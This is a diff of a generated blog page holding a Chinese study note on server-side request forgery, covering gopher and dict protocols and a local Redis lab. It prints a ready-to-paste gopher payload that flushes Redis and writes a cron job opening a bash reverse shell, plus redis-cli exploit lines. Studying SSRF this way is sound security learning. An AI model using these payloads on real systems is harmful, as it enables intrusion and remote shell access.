@@ -6,13 +6,9 @@
     <meta charset="utf-8">
     <meta name="keywords" content="SSRF服务器端请求伪造, 学习记录">
     <meta name="description" content="
-
 服务器端请求伪造记录
 
-
-
-
-0x00 了解SSRFSSRF简介：SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄">
+0x00 了解SSRFSSRF简介：SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄露漏洞。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -498,17 +494,13 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>服务器端请求伪造记录</p>
 <span id="more"></span>
-
-
-
 <h2 id="0x00-了解ssrf"><a href="#0x00-了解SSRF" class="headerlink" title="0x00 了解SSRF"></a>0x00 了解SSRF</h2><h3 id="ssrf简介"><a href="#SSRF简介：" class="headerlink" title="SSRF简介："></a>SSRF简介：</h3><p>SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄露漏洞。</p>
 <h3 id="ssrf漏洞原理"><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h3><p>SSRF形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能，但是却没有对目的地址做过滤与限制。比如从指定URL地址获取网页的文本内容，加载指定地址的图片、下载等等。而且在大部分的web服务器架构中，web服务器自身是可以访问互联网和服务器所在的内网的，所以攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
 <p>而且在一般情况下，SSRF攻击的目标是外网无法访问的内部系统（即内网），所以SSRF漏洞也可以用一句话来进行总结：利用一个可以发起网络请求的服务器当作跳板来攻击内部其他服务。</p>
 <h3 id="gopher-dict协议以及redis服务-curl命令"><a href="#gopher、dict协议以及redis服务、curl命令" class="headerlink" title="gopher、dict协议以及redis服务、curl命令"></a>gopher、dict协议以及redis服务、curl命令</h3><p>gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。</p>
-<p>dict协议：一个字典服务器协议—-A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号：2628。 协议详解：</p>
+<p>dict协议：一个字典服务器协议——A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号：2628。 协议详解：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html">https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html</a>           </p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html">https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html</a></p>
 <p>redis服务是在6379端口开启的，这里大致知道一下其用处即可。</p>
@@ -521,9 +513,6 @@
 使用ftp协议 curl -v &quot;ftp:&#x2F;&#x2F;127.0.0.1:端口&#x2F;info&quot;
 使用dict协议 curl -v &quot;dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F;info&quot;
 使用gopher协议 curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:端口&#x2F;_info&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h3 id="常见内网ip段"><a href="#常见内网IP段" class="headerlink" title="常见内网IP段"></a>常见内网IP段</h3><p>局域网地址范围分三类，以下IP段为内网IP段：</p>
 <p><code>C类：192.168.0.0 - 192.168.255.255</code></p>
 <p><code>B类：172.16.0.0 - 172.31.255.255</code></p>
@@ -551,7 +540,6 @@
 $ docker exec -it 容器编号 &#x2F;bin&#x2F;bash #进入容器
 $ apt-get install redis-server # 安装redis服务
 $ redis-server #开启redis服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115712-3aa6359c-5dcc-1.png" alt="img"></p>
 <p>安装好之后，便可以利用协议收集信息及反弹 shell</p>
 <p>利用<code>dict</code>协议，<code>dict://127.0.0.1:6379/info</code>可获取本地<code>redis</code>服务配置信息</p>
@@ -567,13 +555,10 @@ redis-cli -h $1 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
 redis-cli -h $1 config set dbfilename root
 redis-cli -h $1 save
 &#x2F;&#x2F;redis-cli查看所有的keys及清空所有的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于 <code>Gopher</code> 协议的 URL：</p>
 <pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;www&#x2F;html&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>将上面的复制粘贴到网页即可实现攻击。此exp经过url解码如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1 $8 flushall *3 $3 set $1 1 $64 *&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 &#x2F;var&#x2F;www&#x2F;html&#x2F; *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115823-64fbf7b4-5dcc-1.png" alt="img"></p>
 <p>利用<code>Gopher</code> 协议还可以攻击 <code>FastCGI</code>，攻击内网 <code>Vulnerability Web</code>。具体可以参考<a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p>
 <h2 id="ssrf常见绕过"><a href="#SSRF常见绕过" class="headerlink" title="SSRF常见绕过"></a>SSRF常见绕过</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11215#toc-7">https://xz.aliyun.com/t/11215#toc-7</a></p>
@@ -835,7 +820,6 @@ redis-cli -h $1 save
                     <div class="summary block-with-text">
                         
                             
-
 反弹Shell总结
                         
                     </div>
@@ -951,7 +935,7 @@ redis-cli -h $1 save
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -963,7 +947,7 @@ redis-cli -h $1 save
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1092,7 +1076,7 @@ redis-cli -h $1 save
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
